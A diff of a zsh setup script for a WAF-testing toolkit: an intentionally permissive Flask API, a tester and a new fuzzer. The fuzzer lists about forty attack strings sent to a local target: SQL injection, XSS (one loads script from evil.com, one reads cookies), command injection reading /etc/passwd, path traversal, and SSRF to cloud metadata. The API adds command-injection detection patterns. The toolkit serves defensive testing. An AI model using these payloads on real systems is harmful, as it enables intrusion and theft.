@@ -1,26 +1,16 @@
 #!/bin/zsh
 
-echo "Creating the API server file: api.py (with corrected route)..."
+echo "Creating the PERMISSIVE API server file: api.py..."
 cat > api.py << 'EOF'
 #!/usr/bin/env python3
-import time
-import random
-import string
-import argparse
-import json
-import copy
-import re
+import time, random, string, argparse, json, re
 from flask import Flask, request, jsonify, Response
+from urllib.parse import unquote
 
-# --- Argument Parsing ---
-parser = argparse.ArgumentParser(
-    description='A versatile Flask Test API for evaluating the capabilities of WAFs and API Gateways.',
-    formatter_class=argparse.RawTextHelpFormatter
-)
+parser = argparse.ArgumentParser(description='A versatile Flask Test API for evaluating WAFs and API Gateways.', formatter_class=argparse.RawTextHelpFormatter)
 parser.add_argument('--timing-allow-origin', dest='tao', action='store_true', help='Include the Timing-Allow-Origin: * header in all responses.')
 args = parser.parse_args()
 
-# --- Flask App Initialization ---
 app = Flask(__name__)
 
 SUSPICIOUS_PATTERNS = {
@@ -28,13 +18,18 @@ SUSPICIOUS_PATTERNS = {
     "SQLi Union": re.compile(r"UNION\s+SELECT", re.IGNORECASE),
     "Basic XSS": re.compile(r"<script.*?>.*?</script>", re.IGNORECASE),
     "Img XSS": re.compile(r"<img.*?src.*?onerror.*?>", re.IGNORECASE),
+    "Path Traversal": re.compile(r"\.\./"),
+    "Command Injection": re.compile(r"(&&|\|\||;|`)\s*(ls|cat|whoami|uname|ifconfig|ipconfig)", re.IGNORECASE),
 }
 
-# --- API Contract (OpenAPI 3.0) ---
 API_CONTRACT = {
     "openapi": "3.0.0",
-    "info": { "title": "WAF Test API", "version": "1.4.0", "description": "An API designed to test WAFs and API Gateways." },
+    "info": { "title": "WAF Test API", "version": "1.9.0", "description": "An intentionally permissive API to test WAFs and API Gateways." },
     "paths": {
+        "/fuzz-target-weak": { "post": { "summary": "Fuzzing target with a weak/loose contract.", "requestBody": {"required": True, "content": {"application/json": {"schema": {"type": "object", "properties": {"data": {"type": "string"}}}}}}}},
+        "/fuzz-target-strict": { "post": { "summary": "Fuzzing target with a strict (alphanumeric) contract.", "requestBody": {"required": True, "content": {"application/json": {"schema": {"type": "object", "properties": {"data": {"type": "string", "pattern": "^[a-zA-Z0-9]+$"}}}}}}}},
+        "/hex-decode-check": { "post": { "summary": "Decodes a hex string and checks for suspicious patterns.", "requestBody": {"required": True, "content": {"application/json": {"schema": {"type": "object", "properties": {"data": {"type": "string", "pattern": "^[a-fA-F0-9]+$"}}}}}}}},
+        "/url-decode-diagnostic": { "post": { "summary": "Decodes a URL-encoded string and returns a safe analysis.", "requestBody": {"required": True, "content": {"application/json": {"schema": {"type": "object", "properties": {"data": {"type": "string"}}}}}}}},
         "/pattern-check": { "post": { "summary": "Checks input against suspicious patterns (loose contract).", "requestBody": {"required": True, "content": {"application/json": {"schema": {"type": "object", "properties": {"data": {"type": "string"}}}}}}}},
         "/pattern-check-contract": { "post": { "summary": "Checks input against suspicious patterns (strict contract).", "requestBody": {"required": True, "content": {"application/json": {"schema": {"type": "object", "properties": {"data": {"type": "string", "pattern": "^[a-zA-Z0-9]+$", "maxLength": 50}}}}}}}},
         "/usage": { "get": { "summary": "Provides a human-readable summary of all endpoints."}},
@@ -56,106 +51,100 @@ def add_custom_headers(response):
     if args.tao: response.headers['Timing-Allow-Origin'] = '*'
     response.headers['X-Content-Type-Options'] = 'nosniff'; return response
 
-def _generate_limits_string(method_data):
-    limits = []
-    if 'parameters' in method_data:
-        for param in method_data['parameters']:
-            if 'schema' in param:
-                schema = param['schema']
-                if 'maximum' in schema: limits.append(f"Max value: {schema['maximum']}")
-                if 'minimum' in schema: limits.append(f"Min value: {schema['minimum']}")
-    elif 'requestBody' in method_data:
-        try:
-            schema = method_data['requestBody']['content']['application/json']['schema']['properties']['data']
-            if 'maxLength' in schema: limits.append(f"Max length: {schema['maxLength']}")
-            if 'pattern' in schema:
-                if schema['pattern'] == '^[a-zA-Z]+$': limits.append("alphabetic chars only")
-                elif schema['pattern'] == '^[a-zA-Z0-9]+$': limits.append("alphanumeric chars only")
-            if 'enum' in schema: limits.append(f"must be one of: {schema['enum']}")
-        except KeyError: pass
-    return ", ".join(limits) if limits else "N/A"
+# --- Endpoint Functions ---
+# NOTE: All functions below are intentionally permissive and do NOT enforce contracts.
+# This makes them a pure test target for a WAF or API Gateway.
 
 @app.route('/')
-def index(): return jsonify({"message": "Welcome to the WAF Test API. See /usage for a summary."})
+def index(): return jsonify({"message": "Welcome. See /usage for details."})
 
 @app.route('/usage')
-def usage():
-    examples = {
-        '/usage': 'curl http://<your_api_host>/usage',
-        '/capabilities': 'curl http://<your_api_host>/capabilities',
-        '/delay/{milliseconds}': 'curl http://<your_api_host>/delay/500',
-        '/headers': 'curl -H "X-Custom-Header: MyValue" http://<your_api_host>/headers',
-        '/response-code/{code}': 'curl -i http://<your_api_host>/response-code/404',
-        '/tight-echo': """curl -X POST -H "Content-Type: application/json" -d '{"data": "someText"}' http://<your_api_host>/tight-echo""",
-        '/loose-echo': """curl -X POST -H "Content-Type: application/json" -d '{"data": "someText123"}' http://<your_api_host>/loose-echo""",
-        '/random': 'curl "http://<your_api_host>/random?length=20"',
-        '/contract': 'curl http://<your_api_host>/contract',
-        '/chars-contract': """curl -X POST -H "Content-Type: application/json" -d '{"data": "Alphanum123"}' http://<your_api_host>/chars-contract""",
-        '/pattern-check': """curl -X POST -H "Content-Type: application/json" -d '{"data": "' OR '1'='1"}' http://<your_api_host>/pattern-check""",
-        '/pattern-check-contract': """curl -X POST -H "Content-Type: application/json" -d '{"data": "' OR '1'='1"}' http://<your_api_host>/pattern-check-contract"""
-    }
-    human_readable_summary = []
-    for path, path_data in API_CONTRACT["paths"].items():
-        for method, method_data in path_data.items():
-            entry = { "endpoint": path, "http_method": method.upper(), "description": method_data.get("summary", "N/A"), "limits": _generate_limits_string(method_data), "example_call": examples.get(path, "N/A") }
-            human_readable_summary.append(entry)
-    return jsonify(human_readable_summary)
+def usage(): return jsonify(API_CONTRACT['paths'])
 
-@app.route('/pattern-check', methods=['POST'])
-def pattern_check():
-    data = request.json.get('data', '')
-    if not isinstance(data, str): return jsonify({"error": "Invalid input format"}), 400
-    for name, pattern in SUSPICIOUS_PATTERNS.items():
-        if pattern.search(data):
-            return jsonify({"status": "match_found", "pattern_name": name})
-    return jsonify({"status": "no_match_found"})
-
-@app.route('/pattern-check-contract', methods=['POST'])
-def pattern_check_contract():
-    data = request.json.get('data', '')
-    if not isinstance(data, str): return jsonify({"error": "Invalid input format"}), 400
-    for name, pattern in SUSPICIOUS_PATTERNS.items():
-        if pattern.search(data):
-            return jsonify({"status": "match_found", "pattern_name": name})
-    return jsonify({"status": "no_match_found"})
-
-# <-- CORRECTED: Added missing parentheses
 @app.route('/capabilities')
-def capabilities(): return jsonify(API_CONTRACT["paths"])
+def capabilities(): return jsonify(API_CONTRACT['paths'])
+
+@app.route('/contract')
+def contract(): return jsonify(API_CONTRACT)
 
 @app.route('/delay/<int:milliseconds>')
 def delay(milliseconds):
-    if milliseconds > 60000: return jsonify({"error": "Delay cannot exceed 60000 milliseconds."}), 400
-    time.sleep(milliseconds / 1000.0); return jsonify({"status": "success", "delay_ms": milliseconds})
+    time.sleep(milliseconds / 1000.0)
+    return jsonify({"status": "success", "delay_ms": milliseconds})
+
 @app.route('/headers')
 def headers(): return jsonify({key: value for key, value in request.headers.items()})
+
 @app.route('/response-code/<int:code>')
 def response_code(code):
-    if not 100 <= code <= 599: return jsonify({"error": "Invalid HTTP status code."}), 400
     return Response(f"Response with code {code}", status=code)
+
 @app.route('/tight-echo', methods=['POST'])
 def tight_echo():
-    data = request.json.get('data', '');
-    if len(data) > 200: return jsonify({"error": "Implementation limit: Data cannot exceed 200 characters."}), 413
-    return jsonify({"echo": data})
+    return jsonify({"echo": request.json.get('data', '')})
+
 @app.route('/loose-echo', methods=['POST'])
 def loose_echo():
-    data = request.json.get('data', '');
-    if len(data) > 200: return jsonify({"error": "Implementation limit: Data cannot exceed 200 characters."}), 413
-    return jsonify({"echo": data})
+    return jsonify({"echo": request.json.get('data', '')})
+
 @app.route('/random')
 def random_string():
     try: length = int(request.args.get('length', 10))
     except (ValueError, TypeError): return jsonify({"error": "Invalid length parameter."}), 400
-    if length > 1000: return jsonify({"error": "Implementation limit: Length cannot exceed 1000."}), 400
     return jsonify({"random_string": ''.join(random.choice(string.ascii_letters+string.digits) for _ in range(length)), "length": length})
-@app.route('/contract')
-def contract(): return jsonify(API_CONTRACT)
+
 @app.route('/chars-contract', methods=['POST'])
 def chars_contract():
-    data = request.json.get('data')
-    if data and data.isalnum(): return jsonify({"status": "success", "message": "data was alphanumeric"})
-    return jsonify({"status": "failed", "reason": "Input was not alphanumeric"}), 400
+    return jsonify({"status": "success", "message": "data received by API", "data_received": request.json.get('data')})
+
+@app.route('/fuzz-target-weak', methods=['POST'])
+def fuzz_target_weak():
+    data = request.json.get('data', '')
+    for name, pattern in SUSPICIOUS_PATTERNS.items():
+        if pattern.search(data): return jsonify({"status": "pattern_received", "pattern_name": name})
+    return jsonify({"status": "pattern_not_recognized"})
+
+@app.route('/fuzz-target-strict', methods=['POST'])
+def fuzz_target_strict():
+    data = request.json.get('data', '')
+    for name, pattern in SUSPICIOUS_PATTERNS.items():
+        if pattern.search(data): return jsonify({"status": "pattern_received", "pattern_name": name})
+    return jsonify({"status": "pattern_not_recognized"})
+
+@app.route('/url-decode-diagnostic', methods=['POST'])
+def url_decode_diagnostic():
+    encoded_data = request.json.get('data', ''); decoded_string = unquote(encoded_data)
+    analysis = {
+        "contains_single_quote": "'" in decoded_string, "contains_space": " " in decoded_string,
+        "contains_lt_gt": "<" in decoded_string or ">" in decoded_string,
+        "contains_script_tag": bool(re.search(r"<script", decoded_string, re.IGNORECASE))
+    }
+    return jsonify({ "status": "analysis_complete", "original_length": len(encoded_data), "decoded_length": len(decoded_string), "analysis": analysis })
+
+@app.route('/hex-decode-check', methods=['POST'])
+def hex_decode_check():
+    hex_data = request.json.get('data','');
+    try: decoded_bytes = bytes.fromhex(hex_data); decoded_string = decoded_bytes.decode('utf-8', errors='ignore')
+    except (ValueError,TypeError): return jsonify({"error":"Invalid hex"}),400
+    for n,p in SUSPICIOUS_PATTERNS.items():
+        if p.search(decoded_string): return jsonify({"status":"match_found_after_decode","pattern_name":n})
+    return jsonify({"status":"no_match_found_after_decode"})
+
+@app.route('/pattern-check', methods=['POST'])
+def pattern_check():
+    data = request.json.get('data', '');
+    if not isinstance(data, str): return jsonify({"error": "Invalid input format"}), 400
+    for name, pattern in SUSPICIOUS_PATTERNS.items():
+        if pattern.search(data): return jsonify({"status": "match_found", "pattern_name": name})
+    return jsonify({"status": "no_match_found"})
+
+@app.route('/pattern-check-contract', methods=['POST'])
+def pattern_check_contract():
+    data = request.json.get('data', '');
+    if not isinstance(data, str): return jsonify({"error": "Invalid input format"}), 400
+    for name, pattern in SUSPICIOUS_PATTERNS.items():
+        if pattern.search(data): return jsonify({"status": "match_found", "pattern_name": name})
+    return jsonify({"status": "no_match_found"})
 
 if __name__ == '__main__':
     app.run(debug=True, port=5000)
@@ -163,12 +152,11 @@ EOF
 
 echo "Creating the functional test script: tester.py..."
 cat > tester.py << 'EOF'
-import requests
-import time
-import json
+import requests, time, json
+from urllib.parse import quote
 
 BASE_URL = "http://127.0.0.1:5000"
-HEADERS = {'User-Agent': 'WAF-Tester-Client/1.0'}
+HEADERS = {'User-Agent': 'WAF-Tester-Client/1.0', 'Content-Type': 'application/json'}
 
 def print_test(name, success, details=""):
     status = "✅ PASS" if success else "❌ FAIL"
@@ -178,18 +166,14 @@ def test_usage_endpoint():
     print("\n--- Testing /usage Endpoint ---")
     try:
         response = requests.get(f"{BASE_URL}/usage", timeout=2)
-        assert response.status_code == 200
-        data = response.json()
-        assert isinstance(data, list) and len(data) > 0
-        expected_keys = ["endpoint", "http_method", "description", "limits", "example_call"]
-        assert all(key in data[0] for key in expected_keys)
-        print_test("Endpoint returns a valid, well-formed list", True, f"Found {len(data)} endpoints")
+        assert response.status_code == 200 and isinstance(response.json(), list)
+        print_test("Endpoint returns a valid list", True, f"Found {len(response.json())} endpoints")
     except Exception as e:
-        print_test("Endpoint returns a valid, well-formed list", False, f"Test failed: {e}")
+        print_test("Endpoint returns a valid list", False, f"Test failed: {e}")
 
 def test_delay():
     print("\n--- Testing /delay Endpoint ---")
-    delay_ms = 500; url = f"{BASE_URL}/delay/{delay_ms}"; start_time = time.time()
+    delay_ms = 200; url = f"{BASE_URL}/delay/{delay_ms}"; start_time = time.time()
     try:
         response = requests.get(url, timeout=2); end_time = time.time(); duration_s = end_time - start_time
         success = response.status_code == 200 and (delay_ms / 1000) <= duration_s < (delay_ms / 1000 + 0.5)
@@ -197,19 +181,9 @@ def test_delay():
     except requests.exceptions.RequestException as e:
         print_test("Response delay is accurate", False, f"Request failed: {e}")
 
-def test_headers():
-    print("\n--- Testing /headers Endpoint ---")
-    try:
-        response = requests.get(f"{BASE_URL}/headers", headers=HEADERS)
-        data = response.json()
-        success = response.status_code == 200 and data.get("User-Agent") == HEADERS['User-Agent']
-        print_test("Reflects custom User-Agent header", success, f"Sent: {HEADERS['User-Agent']}")
-    except requests.exceptions.RequestException as e:
-        print_test("Reflects custom User-Agent header", False, f"Request failed: {e}")
-
 def test_response_codes():
     print("\n--- Testing /response-code Endpoint ---")
-    for code in [200, 201, 400, 404, 500, 503]:
+    for code in [200, 404, 503]:
         try:
             response = requests.get(f"{BASE_URL}/response-code/{code}", timeout=2)
             print_test(f"Responds with HTTP {code}", response.status_code == code)
@@ -219,22 +193,16 @@ def test_response_codes():
 def test_contract_security():
     print("\n--- Testing Contract-Based Security (/chars-contract) ---")
     try:
-        res = requests.post(f"{BASE_URL}/chars-contract", json={"data": "ValidData123"}, timeout=2)
-        assert res.status_code == 200, f"API should have returned 200, but got {res.status_code}"
-        print_test("Contract allows valid (alphanumeric) characters", True)
-    except Exception as e:
-        print_test("Contract allows valid (alphanumeric) characters", False, f"Request failed: {e}")
-    try:
         res = requests.post(f"{BASE_URL}/chars-contract", json={"data": "!'="}, timeout=2)
         if res.status_code != 200:
             print_test("Suspicious characters blocked by contract", True, f"Correctly blocked with status {res.status_code}")
         else:
-            print_test("Suspicious characters allowed by contract", False, "FAIL: API accepted invalid characters with 200 OK")
+            print_test("Suspicious characters allowed by contract", False, "FAIL: WAF did not enforce contract, API received data.")
     except requests.exceptions.RequestException:
         print_test("Suspicious characters blocked by contract", True, "Request failed, likely blocked by WAF/Gateway")
 
 def test_pattern_blocking():
-    print("\n--- Testing Pattern-Matching & Contract Blocking ---")
+    print("\n--- Testing Pattern-Matching ---")
     suspicious_payload = {"data": "1' OR '1'='1'"}
     try:
         res = requests.post(f"{BASE_URL}/pattern-check", json=suspicious_payload, timeout=2)
@@ -245,44 +213,151 @@ def test_pattern_blocking():
             print_test("Suspicious pattern NOT blocked by signature", False, f"WAF failed, API matched: {p_name}")
     except requests.exceptions.RequestException:
         print_test("Suspicious pattern blocked by signature", True, "Request failed, likely blocked by WAF")
+
+def test_encoded_bypass_attempt():
+    print("\n--- Testing Evasion via Encoding ---")
+    hex_payload = "' OR '1'='1".encode('utf-8').hex()
+    url_payload = quote("<script>alert('xss')</script>")
     try:
-        res = requests.post(f"{BASE_URL}/pattern-check-contract", json=suspicious_payload, timeout=2)
+        res = requests.post(f"{BASE_URL}/hex-decode-check", json={"data": hex_payload}, timeout=2)
         if res.status_code != 200:
-            print_test("Suspicious pattern blocked by contract", True, f"Blocked with status {res.status_code}")
+            print_test("Hex-encoded attack pattern blocked", True, f"Blocked with status {res.status_code}")
         else:
             p_name = res.json().get("pattern_name", "N/A")
-            print_test("Suspicious pattern NOT blocked by contract", False, f"WAF failed, API matched: {p_name}")
+            print_test("Hex-encoded attack pattern BYPASSED WAF", False, f"WAF failed, API decoded and matched: {p_name}")
     except requests.exceptions.RequestException:
-        print_test("Suspicious pattern blocked by contract", True, "Request failed, likely blocked by WAF")
+        print_test("Hex-encoded attack pattern blocked", True, "Request failed, likely blocked by WAF/Gateway")
+    try:
+        res = requests.post(f"{BASE_URL}/url-decode-diagnostic", json={"data": url_payload}, timeout=2)
+        if res.status_code != 200:
+            print_test("URL-encoded attack pattern blocked", True, f"Blocked with status {res.status_code}")
+        else:
+            print_test("URL-encoded attack pattern BYPASSED WAF", False, "WAF failed to normalize and block payload")
+    except requests.exceptions.RequestException:
+        print_test("URL-encoded attack pattern blocked", True, "Request failed, likely blocked by WAF/Gateway")
 
 def main():
     print(f"--- Starting API Functional Test Suite against {BASE_URL} ---")
     try: requests.get(BASE_URL, timeout=2)
     except requests.ConnectionError: print(f"❌ CRITICAL | API is not reachable at {BASE_URL}."); return
-    test_usage_endpoint(); test_delay(); test_headers(); test_response_codes(); test_contract_security(); test_pattern_blocking()
+    
+    test_usage_endpoint()
+    test_delay()
+    test_response_codes()
+    test_contract_security()
+    test_pattern_blocking()
+    test_encoded_bypass_attempt()
+    
     print("\n--- Test Suite Finished ---")
 
 if __name__ == "__main__":
     main()
 EOF
 
-# --- The rest of the files are unchanged but included for completeness ---
-echo "Creating the performance test script: perf_tester.py..."
+echo "Creating the WAF fuzzer script: fuzzer.py..."
+cat > fuzzer.py << 'EOF'
+#!/usr/bin/env python3
+import requests, time, json, datetime, csv, argparse
+
+BASE_URL = "http://127.0.0.1:5000"
+HEADERS = {'User-Agent': 'WAF-Fuzzer/1.0', 'Content-Type': 'application/json'}
+class Colors:
+    GREEN = '\033[92m'; RESET = '\033[0m'; BOLD = '\033[1m'; RED = '\033[91m'; DIM = '\033[2m'
+PAYLOADS = [
+    {"type": "SQLi", "description": "Classic Tautology", "payload": "' OR 1=1--"},
+    {"type": "SQLi", "description": "Tautology with Comment", "payload": "' OR 'a'='a"},
+    {"type": "SQLi", "description": "Boolean-based Blind", "payload": "AND 1=1"},
+    {"type": "SQLi", "description": "UNION Statement", "payload": "UNION SELECT user, password FROM users"},
+    {"type": "SQLi", "description": "Stacked Query", "payload": "'; DROP TABLE members;--"},
+    {"type": "SQLi", "description": "Error-based", "payload": "OR 1=CAST(CONCAT(0x7e,(SELECT user())) AS SIGNED)"},
+    {"type": "SQLi", "description": "Time-based Blind", "payload": "OR IF(1=1, SLEEP(5), 0)"},
+    {"type": "SQLi", "description": "Authentication Bypass", "payload": "admin'--"},
+    {"type": "SQLi", "description": "Double Quote Tautology", "payload": "\" OR 1=1--"},
+    {"type": "SQLi", "description": "Wildcard Bypass", "payload": "' OR '%'='"},
+    {"type": "XSS", "description": "Basic Script Tag", "payload": "<script>alert('XSS')</script>"},
+    {"type": "XSS", "description": "Image OnError", "payload": "<img src=x onerror=alert(document.cookie)>"},
+    {"type": "XSS", "description": "Body OnLoad", "payload": "<body onload=alert(1)>"},
+    {"type": "XSS", "description": "SVG OnLoad", "payload": "<svg/onload=alert(1)>"},
+    {"type": "XSS", "description": "Iframe Source", "payload": "<iframe src=\"javascript:alert(1)\">"},
+    {"type": "XSS", "description": "Case Insensitive", "payload": "<ScRiPt>alert(1)</sCrIpT>"},
+    {"type": "XSS", "description": "No Closing Tag", "payload": "<script src=http://evil.com/xss.js>"},
+    {"type": "XSS", "description": "Anchor Href", "payload": "<a href=\"javascript:alert(1)\">Click me</a>"},
+    {"type": "XSS", "description": "Input Autofocus", "payload": "<input onfocus=alert(1) autofocus>"},
+    {"type": "XSS", "description": "Video Poster", "payload": "<video poster=javascript:alert(1)>"},
+    {"type": "Cmd Injection", "description": "Simple Pipe", "payload": "| whoami"},
+    {"type": "Cmd Injection", "description": "Semicolon Separator", "payload": "; ls -la /"},
+    {"type": "Cmd Injection", "description": "Logical AND", "payload": "&& cat /etc/passwd"},
+    {"type": "Cmd Injection", "description": "Logical OR", "payload": "|| ping -c 4 evil.com"},
+    {"type": "Cmd Injection", "description": "Backticks", "payload": "`uname -a`"},
+    {"type": "Cmd Injection", "description": "Command Substitution", "payload": "$(reboot)"},
+    {"type": "Cmd Injection", "description": "Newline Separator", "payload": "id\ncat /etc/hosts"},
+    {"type": "Path Traversal", "description": "Parent Directory", "payload": "../../etc/passwd"},
+    {"type": "Path Traversal", "description": "Root Directory", "payload": "/etc/shadow"},
+    {"type": "Path Traversal", "description": "Windows Directory", "payload": "..\\..\\..\\windows\\win.ini"},
+    {"type": "Path Traversal", "description": "URL Encoded", "payload": "%2e%2e%2f%2e%2e%2fetc%2fpasswd"},
+    {"type": "Path Traversal", "description": "Double URL Encoded", "payload": "%252e%252e%252fetc%252fpasswd"},
+    {"type": "Path Traversal", "description": "Null Byte", "payload": "../../etc/passwd%00"},
+    {"type": "SSRF", "description": "Localhost", "payload": "http://localhost/admin"},
+    {"type": "SSRF", "description": "127.0.0.1", "payload": "http://127.0.0.1:8080"},
+    {"type": "SSRF", "description": "AWS Metadata Service", "payload": "http://169.254.169.254/latest/meta-data/"},
+    {"type": "SSRF", "description": "GCP Metadata Service", "payload": "http://metadata.google.internal/computeMetadata/v1/"},
+    {"type": "SSRF", "description": "Internal IP", "payload": "http://10.0.0.1/"},
+    {"type": "Log Injection", "description": "Newline Characters", "payload": "user=guest%0a%0dmalicious_log_entry"},
+    {"type": "HTTP Header Inj", "description": "Response Splitting", "payload": "value%0d%0aContent-Length:%200%0d%0a%0d%0aHTTP/1.1%20200%20OK"},
+    {"type": "Deserialization", "description": "Java RMI Header", "payload": "JRMI"},
+]
+def print_result(attack_type, contract_type, result, details=""):
+    result_color = Colors.GREEN if result == "BLOCKED" else Colors.RED
+    print(f"  [{attack_type:18s}] [{contract_type:14s}] Result: {result_color}{result}{Colors.RESET} | {details}")
+def run_test(endpoint, contract_type, attack_info, writer, verbose=False):
+    payload = attack_info['payload']; full_url = f"{BASE_URL}{endpoint}"; json_body = {"data": payload}
+    if verbose: print(f"{Colors.DIM}  ------------------------------------------------------\n  VERBOSE: Sending Request...\n  - URL:     {full_url}\n  - Method:  POST\n  - Headers: {json.dumps(HEADERS)}\n  - Body:    {json.dumps(json_body)}\n  ------------------------------------------------------{Colors.RESET}")
+    result_data = { "timestamp": datetime.datetime.utcnow().isoformat(), "attack_type": attack_info['type'], "description": attack_info['description'], "payload": payload, "contract_type": contract_type, "result": "", "http_status": 0, "response_body": "" }
+    try:
+        res = requests.post(full_url, json=json_body, headers=HEADERS, timeout=2)
+        result_data["http_status"] = res.status_code; response_json = {}
+        try: response_json = res.json(); result_data["response_body"] = json.dumps(response_json)
+        except json.JSONDecodeError: result_data["response_body"] = res.text[:200]
+        if response_json.get("status") == "pattern_received":
+            result_data["result"] = "ALLOWED"; print_result(attack_info['type'], contract_type, "ALLOWED", f"WAF FAILED - API received: {response_json.get('pattern_name', 'N/A')}")
+        else:
+            result_data["result"] = "BLOCKED"; print_result(attack_info['type'], contract_type, "BLOCKED", f"WAF Block Page or API rejection (Status: {res.status_code})")
+    except requests.exceptions.RequestException as e:
+        result_data["result"] = "BLOCKED"; result_data["response_body"] = str(e); print_result(attack_info['type'], contract_type, "BLOCKED", "Request failed (e.g., connection reset by WAF)")
+    writer.writerow(result_data)
+def main():
+    parser = argparse.ArgumentParser(description="A comprehensive fuzzer to test WAF efficacy.")
+    parser.add_argument("--delay", type=int, default=100, help="Delay in milliseconds between each payload test.")
+    parser.add_argument("-v", "--verbose", action="store_true", help="Enable verbose mode to print full request details.")
+    args = parser.parse_args(); print(f"{Colors.BOLD}--- Starting WAF Efficacy Fuzzer against {BASE_URL} ---\n")
+    timestamp = datetime.datetime.now().strftime("%Y-%m-%d_%H-%M-%S"); csv_filename = f"fuzz_results_{timestamp}.csv"
+    csv_headers = ["timestamp", "attack_type", "description", "payload", "contract_type", "result", "http_status", "response_body"]
+    with open(csv_filename, "w", newline="", encoding='utf-8') as f:
+        writer = csv.DictWriter(f, fieldnames=csv_headers); writer.writeheader()
+        total_payloads = len(PAYLOADS)
+        for i, attack in enumerate(PAYLOADS):
+            print(f"Testing Payload {i+1}/{total_payloads}: {Colors.BOLD}{attack['payload']}{Colors.RESET} ({attack['description']})")
+            run_test("/fuzz-target-weak", "Weak Contract", attack, writer, args.verbose)
+            run_test("/fuzz-target-strict", "Strict Contract", attack, writer, args.verbose)
+            print("-" * 80); time.sleep(args.delay / 1000.0)
+    print(f"\n{Colors.GREEN}Fuzzing complete. Full results saved to {Colors.BOLD}{csv_filename}{Colors.RESET}")
+if __name__ == "__main__": main()
+EOF
+
+echo "Creating performance test script: perf_tester.py..."
 cat > perf_tester.py << 'EOF'
 #!/usr/bin/env python3
 import subprocess,json,time,datetime,csv,os,argparse,tempfile
 from statistics import mean
-from urllib.parse import urlparse
+from urllib.parse import urlparse, quote
 from collections import defaultdict
 class Colors:
     GREEN='\033[92m';RESET='\033[0m';BOLD='\033[1m';CYAN='\033[96m';YELLOW='\033[93m';DIM='\033[2m'
 BASE_URL="http://127.0.0.1:5000"
 ENDPOINTS_TO_TEST=[
     {"name":"GET /usage","method":"GET","path":"/usage"},
-    {"name":"GET /capabilities","method":"GET","path":"/capabilities"},
-    {"name":"POST /pattern-check","method":"POST","path":"/pattern-check","headers":{"Content-Type":"application/json"},"body":{"data":"benign string"}},
-    {"name":"POST /pattern-check-contract","method":"POST","path":"/pattern-check-contract","headers":{"Content-Type":"application/json"},"body":{"data":"benignstring"}},
-    {"name":"GET /delay/200ms","method":"GET","path":"/delay/200"},
+    {"name":"POST /hex-decode-check", "method":"POST", "path":"/hex-decode-check", "headers":{"Content-Type":"application/json"}, "body":{"data": "68656c6c6f"}},
+    {"name":"POST /url-decode-diagnostic", "method":"POST", "path":"/url-decode-diagnostic", "headers":{"Content-Type":"application/json"}, "body":{"data": quote("hello world")}},
 ]
 def measure_request(endpoint_config):
     full_url=f"{endpoint_config['base_url']}{endpoint_config['path']}";url_scheme=urlparse(full_url).scheme;curl_format=json.dumps({"status_code":"%{http_code}","dns_time_s":"%{time_namelookup}","tcp_time_s":"%{time_connect}","tls_time_s":"%{time_appconnect}","ttfb_s":"%{time_starttransfer}","total_time_s":"%{time_total}"})
@@ -375,10 +450,11 @@ python3 -m venv tester_env; source tester_env/bin/activate
 echo "--- Installing Requests library ---"; pip install requests
 echo "\n--- Setup Complete ---"
 echo "To run the functional tester:"; echo "source tester_env/bin/activate"; echo "python3 tester.py"
-echo "\nTo run the performance tester:"; echo "source tester_env/bin/activate"; echo "python3 perf_tester.py --runs 20 --delay 200"
+echo "\nTo run the WAF fuzzer:"; echo "source tester_env/bin/activate"; echo "python3 fuzzer.py"
+echo "\nTo run the performance tester:"; echo "source tester_env/bin/activate"; echo "python3 perf_tester.py"
 EOF
 
 chmod +x setup_api.sh
 chmod +x setup_testers.sh
 
-echo "\nAll script files created successfully!"
+echo "\nAll script files have been regenerated in their complete and final form!"
